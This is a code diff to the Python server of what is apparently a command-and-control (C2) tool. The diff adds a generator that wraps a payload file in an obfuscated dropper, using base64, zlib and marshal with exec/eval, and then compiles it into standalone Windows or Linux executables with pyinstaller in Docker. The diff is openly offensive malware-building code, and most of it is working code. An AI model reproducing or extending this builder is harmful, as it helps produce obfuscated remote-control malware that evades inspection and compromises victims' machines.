@@ -1,7 +1,10 @@
 import json
 import os
-import subprocesses
+import subprocess
 import platform
+import base64
+import zlib
+import marshal
 
 class C2:
     def __init__(self, sio):
@@ -16,7 +19,7 @@ class C2:
         self.sio.on('disconnect', self.on_disconect)
         self.sio.on('command', self.send_command)
         self.sio.on('result', self.get_result)
-        self.generate()
+        self.generate("Windows")
 
 
     def on_connect(self, sid, data):
@@ -122,18 +125,35 @@ class C2:
 
 
     def generate(self, generate):
-        working_dir = os.getcwd() + '/docker-pyinstaller'
+        with open('payload.py', 'r') as f:
+            payload = f.readlines()
+            
+        dropper = """import sys,zlib,base64,marshal,json,urllib
+        if sys.version_info[0] > 2:
+            from urllib import request
+        urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
+        exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))""".format(repr(base64.b64encode(zlib.compress(marshal.dumps(payload,2)))))
+
+        
         system = platform.system()
+
+        with open("docker-pyinstaller/payload.py", 'w') as f:
+            f.writelines(dropper)
+
+        with open("docker-pyinstaller/requirements.txt", 'w') as f:
+            f.writelines("""geocoder==1.38.1
+python-socketio==5.11.3
+requests==2.32.3""")
         
         if system == generate:
-            #normal
+            print("just pyinstaller")
 
         elif system == "Windows":
-            result = subprocesses.run(f'docker run -v "{working_dir}/src/" cdrx/pyinstaller-windows "pyinstaller test.py"', shell=True, capture_output=True)
+            result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows "pyinstaller -F payload.py"', shell=True, capture_output=True)
             print(result)
 
         elif system == "Darwin" or "Linux":
-            result = subprocesses.run(f'docker run -v "{working_dir}/src/" cdrx/pyinstaller-linux "pyinstaller test.py"', shell=True, capture_output=True)
+            result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-linux "pyinstaller -F payload.py"', shell=True, capture_output=True)
             print(result)
         
         
